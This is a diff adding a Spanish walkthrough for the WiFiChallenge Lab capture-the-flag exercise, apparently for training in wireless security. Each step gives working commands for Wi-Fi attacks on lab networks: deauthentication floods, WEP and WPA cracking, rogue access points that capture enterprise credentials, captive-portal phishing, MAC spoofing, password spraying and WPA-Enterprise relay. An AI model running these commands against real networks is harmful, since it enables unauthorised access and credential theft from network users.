@@ -1,0 +1,327 @@
+# WiFiChallenge Lab v2.0
+
+## Preparación Inicial
+```bash
+mkdir ~/wifi
+sudo airmon-ng start wlan0
+```
+
+## 00. Check VM
+```bash
+sudo su
+cat /root/flag.txt
+```
+
+## 01. Canal del AP wifi-global
+```bash
+sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
+```
+
+## 02. MAC del cliente wifi-IT
+```bash
+sudo airodump-ng wlan0mon -w ~/wifi/scanc11 --manufacturer --wps -c11
+```
+
+## 03. Probe de 78:C1:A7:BF:72:46
+```bash
+sudo airodump-ng wlan0mon -w scan --manufacturer --wps --band abg
+# Buscar en la sección de clientes
+```
+
+## 04. ESSID del AP oculto (F0:9F:C2:6A:88:26)
+```bash
+cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt
+airmon-ng start wlan0 
+iwconfig wlan0mon channel 11
+mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt
+```
+
+## 05. Flag en AP oculto (credenciales por defecto)
+```bash
+# free.conf
+network={
+    ssid="ESSID_ENCONTRADO"
+    key_mgmt=NONE
+    scan_ssid=1
+}
+
+wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
+dhclient wlan2 -v
+# Acceder a 192.168.16.1 con admin/admin
+```
+
+## 06. Flag en router wifi-guest
+```bash
+sudo airodump-ng wlan0mon -w ~/wifi/scanc6 --manufacturer --wps -c6
+
+# open.conf
+network={ 
+    ssid="wifi-guest" 
+    key_mgmt=NONE 
+}
+
+wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
+dhclient -v wlan2
+
+# Cambiar MAC por cliente autorizado
+systemctl stop network-manager
+ip link set wlan2 down
+macchanger -m MAC_CLIENTE_AUTORIZADO wlan2
+ip link set wlan2 up
+
+# Analizar tráfico HTTP en Wireshark
+wireshark ~/wifi/scanc6-01.cap
+```
+
+## 07. Contraseña WEP wifi-old
+```bash
+airmon-ng check kill
+besside-ng -c 1 -b F0:9F:C2:AA:19:29 wlan2 -v
+```
+
+**Manual:**
+```bash
+sudo airodump-ng -c 1 --bssid F0:9F:C2:AA:19:29 -w wifi-old wlan0mon
+sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:AA:19:29 wlan0mon
+sudo aireplay-ng --arpreplay -b F0:9F:C2:AA:19:29 -h CLIENT_MAC wlan0mon
+sudo aircrack-ng wifi-old-01.cap
+```
+
+## 08. Contraseña wifi-mobile
+```bash
+airodump-ng wlan0mon -w ~/wifi/scanc6 -c 6 --wps
+aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
+aircrack-ng ~/wifi/scanc6-02.cap -w ~/rockyou-top100000.txt
+```
+
+## 09. IP del servidor web en wifi-mobile
+```bash
+airdecap-ng -e wifi-mobile -p PASSWORD ~/wifi/scanc6-02.cap
+wireshark ~/wifi/scanc6-02-dec.cap
+```
+
+## 10. Flag después del login en wifi-mobile
+```bash
+# psk.conf
+network={
+    ssid="wifi-mobile"
+    psk="PASSWORD"
+    scan_ssid=1
+    key_mgmt=WPA-PSK
+    proto=WPA2
+}
+
+wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf
+dhclient wlan3 -v
+# Usar cookies robadas del tráfico descifrado
+```
+
+## 11. Aislamiento de clientes wifi-mobile
+```bash
+arp-scan -I wlan3 -l
+curl IP_CLIENTE
+```
+
+## 12. Contraseña wifi-office (RogueAP)
+```bash
+# hostapd.conf
+interface=wlan1
+driver=nl80211
+hw_mode=g
+channel=1
+ssid=wifi-offices
+mana_wpaout=hostapd.hccapx
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+
+hostapd-mana hostapd.conf
+hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
+```
+
+## 13. Contraseña wifi-management (WPA3)
+```bash
+cd ~/tools/wacker
+./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462
+```
+
+## 14. Contraseña wifi-IT (WPA3 Downgrade)
+```bash
+# hostapd-sae.conf
+interface=wlan1
+driver=nl80211
+hw_mode=g
+channel=11
+ssid=wifi-IT
+mana_wpaout=hostapd-management.hccapx
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=12345678
+
+hostapd-mana hostapd-sae.conf
+iwconfig wlan0mon channel 11
+aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25 -c CLIENT_MAC
+hashcat -a 0 -m 2500 hostapd-management.hccapx ~/rockyou-top100000.txt --force
+```
+
+## 15. Dominio de usuarios wifi-regional
+```bash
+airodump-ng wlan0mon -w ~/wifi/scanc44 -c 44 --wps
+wireshark ~/wifi/scanc44-01.cap
+# Filtrar por: eap && eap.identity
+```
+
+## 16. Email del certificado del servidor
+```bash
+cd /root/tools/
+bash pcapFilter.sh -f ~/wifi/scanc44-02.cap -C
+# O usar Wireshark con filtro: (wlan.sa == BSSID) && (tls.handshake.certificate)
+```
+
+## 17. Método EAP soportado por wifi-global
+```bash
+cd /root/tools/EAP_buster/
+bash ./EAP_buster.sh wifi-global 'GLOBAL\GlobalAdmin' wlan1
+```
+
+## 18. Contraseña de juan en wifi-corp (RogueAP)
+```bash
+cd /root/tools/eaphammer
+python3 ./eaphammer --cert-wizard
+python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
+
+# Deauth paralelo
+iwconfig wlan0mon channel 44
+aireplay-ng -0 0 -a AP_BSSID wlan0mon -c CLIENT_MAC
+
+cat logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' >> hashcat.5500
+hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force
+```
+
+## 19. Contraseña CONTOSO\test (Brute Force)
+```bash
+cd ~/tools/air-hammer
+echo 'CONTOSO\test' > test.user
+./air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u test.user
+```
+
+## 20. Usuario con contraseña 12345678 (Password Spray)
+```bash
+cat ~/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > ~/top-usernames-shortlist-contoso.txt
+cd ~/tools/air-hammer
+./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt
+```
+
+## 21. Flag en wifi-regional-tablets (Relay Attack)
+```bash
+systemctl stop network-manager
+airmon-ng stop wlan1mon
+ip link set wlan1 down
+macchanger -m F0:9F:C2:00:00:00 wlan1
+ip link set wlan1 up
+
+# wpa_sycophant_example.conf
+network={
+  ssid="wifi-regional-tablets"
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  identity=""
+  anonymous_identity=""
+  password=""
+  eap=PEAP
+  phase1="crypto_binding=0 peaplabel=0"
+  phase2="auth=MSCHAPV2"
+  bssid_blacklist=F0:9F:C2:00:00:00
+}
+
+cd ~/tools/berate_ap/
+./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
+
+# Shell 2 - Deauth
+iwconfig wlan0mon channel 44
+aireplay-ng -0 0 wlan0mon -a F0:9F:C2:7A:33:28 -c CLIENT_MAC
+
+# Shell 3 - Sycophant
+cd ~/tools/wpa_sycophant/
+./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
+
+# Shell 4 - DHCP
+dhclient wlan3 -v
+```
+
+## 22. Flag en wifi-regional
+Mismo proceso que el 21, cambiar SSID a "wifi-regional".
+
+## 23. Contraseña de usuario vulnerable de wifi-global (Phishing)
+```bash
+cd ~/tools/eaphammer
+sudo killall dnsmasq
+./eaphammer --essid WiFi-Restaurant --interface wlan4 --captive-portal
+
+# Deauth paralelo
+iwconfig wlan0mon channel 44
+aireplay-ng -0 0 wlan0mon -a F0:9F:C2:71:22:17 -c CLIENT_MAC
+```
+
+**Hostile Portal:**
+```bash
+./eaphammer --essid WiFi-Restaurant --interface wlan2 --hostile-portal
+cat logs/Responder-Session.log | grep NTLMv2 | grep Hash | awk '{print $9}' > responder.5600
+hashcat -a 0 -m 5600 responder.5600 ~/rockyou-top100000.txt --force
+```
+
+## 24. Flag en wifi-regional con credenciales obtenidas
+Usar credenciales del paso anterior para conectarse vía relay y acceder al servidor web.
+
+## 25. Contraseña del Administrador wifi-corp
+```bash
+# Importar certificados reales descargados
+cd /root/tools/eaphammer
+python3 ./eaphammer --cert-wizard import --server-cert server.crt --ca-cert ca.crt --private-key server.key --private-key-passwd whatever
+
+python3 ./eaphammer -i wlan4 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
+```
+
+## 26. Flag en wifi-global AP
+```bash
+# Generar certificado de cliente
+openssl genrsa -out client.key 2048
+openssl req -config client.conf -new -key client.key -out client.csr
+openssl x509 -days 730 -extfile client.ext -CA ca.crt -CAkey ca.key -CAserial ca.serial -in client.csr -req -out client.crt
+
+# wpa_tls.conf
+network={
+ ssid="wifi-global"
+ scan_ssid=1
+ mode=0
+ proto=RSN
+ key_mgmt=WPA-EAP
+ auth_alg=OPEN
+ eap=TLS
+ identity="GLOBAL\GlobalAdmin"
+ ca_cert="./ca.crt"
+ client_cert="./client.crt"
+ private_key="./client.key"
+ private_key_passwd="whatever" 
+}
+
+wpa_supplicant -Dnl80211 -i wlan4 -c wpa_tls.conf
+```
+
+## 27. MAC del primer atacante en Nzyme
+```bash
+# Acceder a http://127.0.0.1:22900/
+# Credenciales: admin/admin
+# Revisar sección Alerts para encontrar la alerta más antigua
+```
+
+## Herramientas Principales Utilizadas
+- **airodump-ng/aireplay-ng**: Captura y ataques 802.11
+- **aircrack-ng**: Cracking WEP/WPA
+- **hashcat**: Cracking de hashes
+- **eaphammer**: RogueAP para redes Enterprise
+- **wpa_sycophant**: Relay attacks en WPA-Enterprise
+- **mdk4**: Brute force de ESSID ocultos
+- **besside-ng**: Automatización de ataques WEP
